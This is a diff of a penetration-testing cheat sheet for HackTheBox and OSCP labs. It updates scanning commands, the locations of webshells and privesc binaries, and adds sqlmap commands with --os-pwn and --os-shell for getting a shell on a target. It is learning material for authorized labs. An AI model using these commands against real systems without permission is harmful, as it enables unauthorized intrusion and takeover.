@@ -1,14 +1,14 @@
 # Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
 
-> **Last Update**: 08/19/21
+> **Last Update**: 08/27/21
 
-> **Recent Changes**: Additions directly related to IIS enumeration.
+> **Recent Changes**: Additions to SQLMap/RustScan.
 
 ## RustScan - #rustscan 
 ```bash
 #Intial
-rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan
+rustscan -a $IP && xsltproc scan -o scan-${PWD##*/}.html
 #AllPorts
 sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all 10.10.10.241 && xsltproc scan-all -o scan-allports.html && rm -rf scan-all
 #UDP
@@ -66,8 +66,8 @@ os.execute('/bin/bash')}
 
 ## Useful Kali Directories #WSO #PrivEsc #Windows 
 ```bash
-ls /usr/share/webshells/webshells
-ls /usr/share/windows-binaries/privesc
+ls /opt/webshells/webshells
+ls /opt/windows-binaries/
 ```
 
 ## File Uploading/Downloading #Windows #PowerShell #WGET #SMB 
@@ -218,7 +218,16 @@ feroxbuster -u http://${PWD##*/}/ -x php js txt -w /usr/share/seclists/Discovery
 nikto -host http://${PWD##*/} -C all -o nikto-scan.html
 nikto -host http://${PWD##*/} -p 80,8080,1234 -C all -o nikto-all.html
 nikto -h ${PWD##*/} -useproxy http://${PWD##*/}:4444 #squidcd
+```
+
+#SQL
+```bash
 sqlmap --wizard
+sqlmap --force-ssl
+#Grab the Request from Burp for Login/Form Req
+sqlmap -r req --os-pwn
+#Use OS-Shell alongside a Bash One-liner for a more stable shell.
+sqlmap -r req --os-shell
 ```
 
 #IIS
